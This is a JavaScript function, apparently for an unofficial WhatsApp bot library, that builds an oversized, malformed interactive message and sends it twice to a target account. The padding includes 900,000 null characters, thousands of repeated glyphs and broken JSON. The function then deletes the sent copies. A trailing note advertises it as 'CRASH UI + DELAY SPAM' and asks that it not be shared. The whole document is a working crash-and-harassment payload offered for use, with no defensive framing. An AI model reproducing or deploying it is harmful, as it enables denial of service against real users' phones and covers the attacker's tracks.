async function apdetCrash(xrelly, objective) {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           header: {
              title: "XrL Demonic0n ¿ ?" + "ꦽ".repeat(5000),
              hasMediaAttachment: false,
            },
            body: {
              text: " — Sweet penance for a sound - it might explode in our hands ",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },
              quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "🦠",
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
              version: 3
                },
              },
            },
          },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: ""
                 },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };
    
    const [xx, x] = await Promise.all([
    xrelly.relayMessage(objective, message, {
      messageId: "",
      participant: { jid: objective },
      userJid: objective
    }),
    xrelly.relayMessage(objective, message, {
      messageId: "",
      participant: { jid: objective },
      userJid: objective
    })
  ]);

  await Promise.all([
    xrelly.sendMessage(objective, { delete: { fromMe: true, remoteJid: objective, id: xx } }),
    xrelly.sendMessage(objective, { delete: { fromMe: true, remoteJid: objective, id: x } })
  ]);
}
FUNCTION CRASH UI + DELAY SPAM

EFFECT:
- CRASH UI ( NOT WORK ALL DEVICE )
- DELAY SPAM

NOTE: GAUSAH SHARE KE PT KALIAN KECUALI OWN.